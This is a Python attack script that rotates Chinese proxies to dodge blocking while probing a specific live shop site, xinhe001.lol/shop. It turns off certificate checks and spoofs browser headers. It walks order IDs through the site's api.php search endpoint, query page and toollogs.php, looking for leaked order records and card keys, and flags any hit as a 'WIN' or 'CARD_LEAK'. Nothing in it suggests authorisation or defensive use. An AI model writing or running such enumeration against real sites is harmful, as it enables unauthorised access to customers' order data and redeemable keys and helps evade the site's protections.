#!/usr/bin/env python3
"""Rotate CN proxies and deep-probe xinhe001.lol/shop."""
import json
import re
import subprocess
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/xinhe001_proxy_deep.json"
ROUNDS = int(sys.argv[2]) if len(sys.argv) > 2 else 12
API_N = int(sys.argv[3]) if len(sys.argv) > 3 else 40

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def load_env():
    env = {}
    path = "/data/config/proxy.env"
    if not __import__("os").path.isfile(path):
        return env
    for line in open(path):
        if "=" in line and not line.startswith("#"):
            k, v = line.strip().split("=", 1)
            env[k] = v.strip('"').strip("'")
    return env


def leak(t):
    return SHOW.search(t) or FAKA.search(t) or "kminfo" in t or (
        "----" in t and "COM" in t
    )


def probe_round(i):
    subprocess.run(["/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True, timeout=35)
    env = load_env()
    px = env.get("PROXY_URL", "")
    if not px:
        return {"i": i, "error": "no proxy"}
    proxies = {"http": px, "https": px}
    row = {"i": i, "area": env.get("PROXY_AREA", ""), "server": env.get("PROXY_SERVER", "")}
    s = requests.Session()
    s.verify = False
    s.proxies = proxies
    s.headers.update({"User-Agent": UA, "Referer": BASE})
    try:
        home = s.get(BASE, timeout=25)
        row["home_len"] = len(home.text)
        if len(home.text) < 5000:
            row["blocked"] = True
            return row
        gc = s.get(BASE + "ajax.php?act=getcount", timeout=20)
        row["getcount"] = gc.text[:200]
        try:
            orders = int(json.loads(gc.text).get("orders", 5718))
        except Exception:
            orders = 5718
        row["orders"] = orders

        # query surface
        for q in ["1", "123", "888"]:
            r = s.get(BASE, params={"mod": "query", "data": q}, timeout=20)
            so = SHOW.findall(r.text)
            if so:
                row["query_hit"] = {"data": q, "shows": so[:5]}
                print(f"QUERY HIT {q} {len(so)}", flush=True)
            time.sleep(0.8)

        # api scan
        api_hits = []
        for oid in range(orders, orders - API_N, -1):
            try:
                r = s.get(BASE + f"api.php?act=search&id={oid}", timeout=15)
                if leak(r.text) or (
                    '"code":0' in r.text
                    and "验证失败" not in r.text
                    and len(r.text) > 60
                ):
                    api_hits.append({"id": oid, "body": r.text[:400]})
                    print(f"API HIT {oid}", r.text[:80], flush=True)
            except Exception:
                pass
            time.sleep(1.0)
        row["api_hits"] = api_hits

        # toollogs
        tl = s.get(BASE + "toollogs.php", timeout=15)
        shows = SHOW.findall(tl.text)
        row["toollogs_shows"] = len(shows)
        if shows:
            row["toollogs_sample"] = shows[:5]
            print(f"TOOLLOGS {len(shows)}", flush=True)

        row["WIN"] = bool(api_hits or row.get("query_hit") or shows)
    except Exception as e:
        row["error"] = str(e)[:120]
    return row


def main():
    results = []
    wins = []
    for i in range(ROUNDS):
        print(f"=== round {i+1}/{ROUNDS} ===", flush=True)
        row = probe_round(i + 1)
        results.append(row)
        if row.get("WIN"):
            wins.append(row)
        time.sleep(2)
    out = {
        "target": "xinhe001.lol",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "rounds": ROUNDS,
        "wins": wins,
        "results": results,
        "CARD_LEAK": bool(wins),
    }
    with open(OUT, "w") as f:
        json.dump(out, f, indent=2, ensure_ascii=False)
    print("DONE", OUT, "CARD_LEAK=", out["CARD_LEAK"], "wins=", len(wins), flush=True)


if __name__ == "__main__":
    main()
